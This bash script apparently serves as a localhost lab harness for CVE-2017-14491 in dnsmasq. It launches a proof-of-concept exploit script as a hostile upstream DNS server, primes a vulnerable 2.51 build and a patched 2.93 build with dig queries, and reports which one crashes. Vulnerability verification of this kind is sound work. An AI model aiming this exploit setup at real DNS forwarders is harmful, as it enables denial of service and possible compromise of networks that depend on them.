#!/usr/bin/env bash
# DEFINITIVE A/B lab. Proves the testbed discriminates crash vs no-crash.
#  A) dnsmasq 2.51 (vulnerable)  -> MUST crash
#  B) dnsmasq 2.93 (patched, system) -> MUST survive
set -u
LAB="$(cd "$(dirname "$0")" && pwd)"; cd "$LAB"
DM_VULN="$LAB/dnsmasq-git/src/dnsmasq"
DM_PATCHED="/usr/sbin/dnsmasq"
ATT_PID=""; DM_PID=""
trap 'kill $ATT_PID $DM_PID 2>/dev/null' EXIT

run_case () {
  local label="$1" binary="$2" conf="$3"
  ATT_PID=""; DM_PID=""
  ( exec python2 google_cve_2017_14491.py 127.0.0.2 5300 > "att_$label.log" 2>&1 ) &
  ATT_PID=$!
  sleep 1
  "$binary" -C "$conf" --no-daemon > "dm_$label.log" 2>&1 &
  DM_PID=$!
  sleep 1.5
  if ! kill -0 "$DM_PID" 2>/dev/null; then echo "  [$label] setup FAIL"; cat "dm_$label.log"; return; fi
  for i in 1 2 3; do
    dig @127.0.0.1 -p 53535 -x 8.8.8.125 +time=3 +tries=1 >/dev/null 2>&1
    sleep 0.6
    kill -0 "$DM_PID" 2>/dev/null || { echo "  [$label] dnsmasq DIED after priming query #$i"; break; }
  done
  sleep 1
  if kill -0 "$DM_PID" 2>/dev/null; then
    echo "  [$label] RESULT: ALIVE (no crash)"
  else
    echo "  [$label] RESULT: CRASHED"
  fi
  kill "$DM_PID" "$ATT_PID" 2>/dev/null; sleep 0.5
}

echo "=== A) dnsmasq 2.51 (vulnerable build) ==="
run_case vuln "$DM_VULN" "$LAB/etc/dnsmasq.conf"
echo "=== B) dnsmasq 2.93 (patched system build) ==="
sed 's/^port=53535/port=53536/' "$LAB/etc/dnsmasq.conf" > "$LAB/etc/dnsmasq-293.conf"
# patched binary must also forward to the attacker
run_case patched "$DM_PATCHED" "$LAB/etc/dnsmasq-293.conf"
echo "=== done ==="
